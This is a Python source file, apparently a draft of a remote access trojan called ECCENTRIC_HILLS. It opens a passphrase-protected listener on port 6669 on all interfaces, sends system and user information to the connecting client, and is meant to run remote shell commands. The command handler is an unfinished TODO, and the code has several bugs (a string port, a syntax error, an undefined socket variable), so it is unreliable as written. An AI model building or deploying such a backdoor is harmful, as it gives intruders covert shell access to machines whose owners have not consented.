#ECCENTRIC_HILLS - *NIX Server Deployment Binary
#Written by Gunnar Jones - gunSec
#https://github.com/acrinklaw/eccentric_hills
#grabbing our libraries
import socket
import threading
import os
import subprocess

#grab some easy system info to pass to client upon connection
uname = subprocess.call('uname -a', shell=True)
w = subprocess.call('w', shell=True)


#Set server to accept connections from any interface, port 6669
BINDIP = "0.0.0.0"
BINDPORT = "6669"
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((BINDIP,BINDPORT))

#server can handle up to 3 concurrent sessions
server.listen(3)

def commands(command):
    command = command.rstrip()
    #TODO
    #detect ! as first character, send to script function
    #or send *nix command to subprocess.call('cmd', shell=True)
    #if return code != 0 print error, otherwise return output and send over
    #/TODO


#main server functions, command parsing
def shell():
    run = True
    while run:
        buffer = ""
        while "\n" not in buffer:
            buffer += clientSocket.recv(1024)
        output = commands(buffer)
        clientSocket.send(output)




#Client Handler, require predetermined hash/passphrase to establish connection
def handleClient(clientSocket):
    hashpass = clientSocket.recv(1024)
    if hashpass == 'gunclawpythonratniBBa':
        #send the w and uname to client, jump to shell loop
        clientSocket.send("\n[+] Accepted Connection")
        clientSocket.send("Current Users (w):\n"+w+"\n")
        clientSocket.send("uname -a:\n"+uname+"\n")
        shell()
    else:
        clientSocket.close()
        main()




#Main, waiting for connection loop
def main():
    while True:
        client,addr = server.accept()
        clientHandler = threading.Thread(target=handleClient,args(client,))
        clientHandler.start()



if __name__ == '__main__':
    main()
